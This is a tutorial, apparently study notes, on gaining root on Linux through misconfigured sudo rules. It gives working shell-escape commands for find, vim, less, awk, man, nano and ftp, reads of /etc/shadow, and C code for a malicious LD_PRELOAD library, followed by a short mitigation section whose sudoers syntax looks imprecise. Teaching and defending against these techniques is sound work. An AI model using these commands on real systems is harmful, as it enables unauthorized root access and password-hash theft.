# Linux Privilege Escalation: Sudo Misconfigurations

---

# Table of Contents

1. Introduction to Sudo Misconfigurations
2. Enumeration Phase
3. Privilege Escalation Categories
    - Intended Functionality Abuse
    - Shell Escaping
    - Environment Variable Abuse
4. GTFOBins Methodology
5. Common Exploitable Binaries
    - find
    - more / less
    - nano
    - vim
    - awk
    - man
    - ftp
    - nmap
    - apache2
6. Environment Variable Exploits
    - LD_PRELOAD
    - LD_LIBRARY_PATH
7. Troubleshooting Common Errors
8. Defensive Mitigations
9. Quick Revision Table

---

# 1. Introduction to Sudo Misconfigurations

Linux systems use **sudo (Superuser Do)** to allow normal users to execute commands with elevated privileges.

Permissions are defined inside:

```bash
/etc/sudoers
```

System administrators configure which users can execute specific commands as another user (usually root).

Example:

```bash
user ALL=(root) NOPASSWD: /usr/bin/find
```

This means:

- User can execute `/usr/bin/find`
- As root
- Without entering a password

---

## Why Misconfigurations Occur

Privilege escalation becomes possible when administrators grant access to binaries that:

- Execute shell commands
- Read sensitive files
- Write arbitrary files
- Load external libraries
- Provide interactive interfaces

Examples:

- find
- vim
- less
- nano
- awk
- ftp
- nmap

---

# 2. Enumeration Phase

Whenever initial access is obtained on a Linux machine, the first step is:

```bash
sudo -l
```

This command shows all sudo permissions available to the current user.

Example:

```bash
User guest may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/find
```

Meaning:

- Current user = guest
- Can run = find
- As = root
- Password required = No

---

# 3. Privilege Escalation Categories

Sudo privilege escalation generally falls into three categories.

---

# Category 1: Intended Functionality Abuse

## Concept

A binary is abused using its legitimate functionality.

No hidden tricks.

Simply use the program exactly as intended.

---

## Example: Reading Sensitive Files

Suppose:

```bash
sudo more /etc/shadow
```

If allowed, attacker can directly read password hashes.

Similarly:

```bash
sudo less /etc/shadow
```

These hashes can then be cracked offline.

---

## Example: Apache2 Error-Based File Read

Suppose:

```bash
sudo apache2 -f /etc/shadow
```

Apache expects a configuration file.

Since `/etc/shadow` isn't valid configuration:

Apache throws an error.

During the error process, parts of the file may be printed.

This results in:

**Partial Arbitrary File Read**

---

# Category 2: Shell Escaping

## Concept

Some programs allow execution of external commands.

If the binary runs as root, spawned commands also run as root.

Result:

```bash
root shell
```

---

# Category 3: Environment Variable Abuse

Misconfigured sudoers may preserve dangerous environment variables.

Example:

```bash
env_keep+=LD_PRELOAD
env_keep+=LD_LIBRARY_PATH
```

This enables code execution as root.

---

# 4. GTFOBins Methodology

GTFOBins is the most important resource for Linux PrivEsc.

Website:

https://gtfobins.github.io

Steps:

1. Visit GTFOBins.
2. Search the allowed binary.
3. Select the **Sudo** section.
4. Copy exploit command.

Examples:

- find
- vim
- less
- nano
- awk
- ftp

---

# 5. Common Exploitable Binaries

---

# 5.1 Exploiting find

Suppose:

```bash
sudo -l
```

Output:

```bash
(root) NOPASSWD: /usr/bin/find
```

Exploit:

```bash
sudo find . -exec /bin/sh \; -quit
```

Explanation:

| Component | Purpose |
|----------|---------|
| sudo find . | Execute find as root |
| -exec | Execute another command |
| /bin/sh | Spawn shell |
| \; | End exec statement |
| -quit | Exit immediately |

Verify:

```bash
whoami
```

Output:

```bash
root
```

---

# 5.2 Exploiting more / less

## Enumeration

```bash
sudo -l
```

Output:

```bash
(root) NOPASSWD: /usr/bin/more
```

---

## Step 1

Launch a large file:

```bash
sudo more /etc/services
```

Large files ensure interactive mode.

---

## Step 2

Inside more:

```text
!/bin/sh
```

Result:

```bash
# whoami
root
```

---

## Common Issues

### Issue:

```bash
!/bin/sh
```

typed directly in Bash.

Error:

```bash
event not found
```

Reason:

`!` in Bash means history expansion.

Must be executed inside:

```bash
more
less
man
```

---

### Issue:

Program exits immediately.

Reason:

Target file too small.

Solution:

Use larger file:

```bash
/ etc/services
```

---

# 5.3 Exploiting nano

Suppose:

```bash
(root) NOPASSWD: /usr/bin/nano
```

---

## Method 1: Read File Escape

Launch:

```bash
sudo nano
```

Press:

```text
Ctrl + R
Ctrl + R
```

Execute:

```bash
reset; sh 1>&0 2>&0
```

Result:

Root shell.

---

## Method 2: Arbitrary File Editing

Open:

```bash
sudo nano /etc/passwd
```

Potential abuse:

- Modify root password
- Add new root user

---

## Important Note

Incorrect modification of:

```bash
/etc/passwd
/etc/shadow
```

may break the entire system.

---

# 5.4 Exploiting vim

Launch:

```bash
sudo vim
```

Inside command mode:

```vim
:!/bin/bash
```

or

```vim
:!/bin/sh
```

Result:

```bash
root shell
```

---

# 5.5 Exploiting awk

Suppose:

```bash
(root) NOPASSWD: /usr/bin/awk
```

Exploit:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

## Important Note

Exact binary path matters.

Example:

Allowed:

```bash
/usr/bin/awk
```

Not allowed:

```bash
mawk
gawk
```

Sudo performs strict path matching.

---

# 5.6 Exploiting man

Launch:

```bash
sudo man man
```

Inside man:

```text
!/bin/sh
```

Result:

Root shell.

---

# 5.7 Exploiting ftp

Launch:

```bash
sudo ftp
```

Inside ftp:

```text
!/bin/sh
```

Result:

Root shell.

---

# 5.8 Exploiting nmap

Older versions:

```bash
sudo nmap --interactive
```

Inside:

```bash
!sh
```

Modern versions may not support this.

---

# 5.9 Exploiting apache2

Example:

```bash
sudo apache2 -f /etc/shadow
```

Purpose:

Read sensitive files through error messages.

---

# 6. Environment Variable Exploits

---

# 6.1 LD_PRELOAD Exploit

---

## Backend Concept

LD_PRELOAD forces Linux to load our shared library before any other library.

If sudo preserves this variable:

```bash
env_keep+=LD_PRELOAD
```

Code executes as root.

---

## Step 1: Create Malicious Code

```c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("/bin/bash");
}
```

---

## Step 2: Compile

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so shell.c
```

---

## Step 3: Execute

```bash
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
```

Result:

```bash
root shell
```

---

# 6.2 LD_LIBRARY_PATH Exploit

---

## Backend Concept

LD_LIBRARY_PATH changes where programs search for shared libraries.

Example:

```bash
env_keep+=LD_LIBRARY_PATH
```

---

## Step 1

Check dependencies:

```bash
ldd /usr/sbin/apache2
```

Example:

```bash
libcrypt.so.1
```

---

## Step 2

Compile malicious library:

```bash
gcc -shared -fPIC \
-o /tmp/libcrypt.so.1 \
library_path.c
```

---

## Step 3

Hijack search path:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

Program loads attacker's library first.

Result:

```bash
root shell
```

---

# 7. Troubleshooting Common Errors

---

## Error:

```bash
Sorry, user is not allowed...
```

Reason:

Binary path mismatch.

Allowed:

```bash
/usr/bin/awk
```

Executed:

```bash
mawk
```

---

## Error:

```bash
event not found
```

Reason:

Attempted shell escape outside interactive binary.

---

## Error:

Segmentation Fault

Reason:

Malicious library missing required symbols.

---

## Fixes

### Use constructor:

```c
__attribute__((constructor))
```

### Or implement missing functions.

---

# 8. Defensive Mitigations

System administrators should:

## Avoid:

```bash
NOPASSWD
```

for interactive binaries.

Examples:

- vim
- nano
- less
- more
- man

---

## Restrict arguments whenever possible.

Example:

Instead of:

```bash
ALL=(ALL) NOPASSWD: /usr/bin/find
```

Use:

```bash
ALL=(ALL) /usr/bin/find /specific/path/*
```

---

## Remove dangerous environment variables:

```bash
Defaults !env_keep += LD_PRELOAD
Defaults !env_keep += LD_LIBRARY_PATH
```

---

## Audit sudoers regularly.

---

# 9. Quick Revision Table

| Category | Technique | Example |
|----------|------------|---------|
| Intended Functionality | File Read | `sudo apache2 -f /etc/shadow` |
| Shell Escape | Spawn Bash | `sudo vim -> :!/bin/bash` |
| find | Command Execution | `sudo find . -exec /bin/sh \; -quit` |
| awk | System Call | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| more/less | Pager Escape | `!/bin/sh` |
| nano | Read File Escape | `Ctrl+R -> Ctrl+R` |
| Environment Variables | Code Injection | `sudo LD_PRELOAD=/tmp/preload.so find` |
| Library Hijacking | Search Path Override | `sudo LD_LIBRARY_PATH=/tmp apache2` |

---

# Golden Rule

Whenever you see:

```bash
sudo -l
```

Ask yourself:

1. Can it read files?
2. Can it write files?
3. Can it execute commands?
4. Is it interactive?
5. Does GTFOBins contain it?
6. Are dangerous environment variables preserved?

If the answer is **yes**, privilege escalation is usually possible.
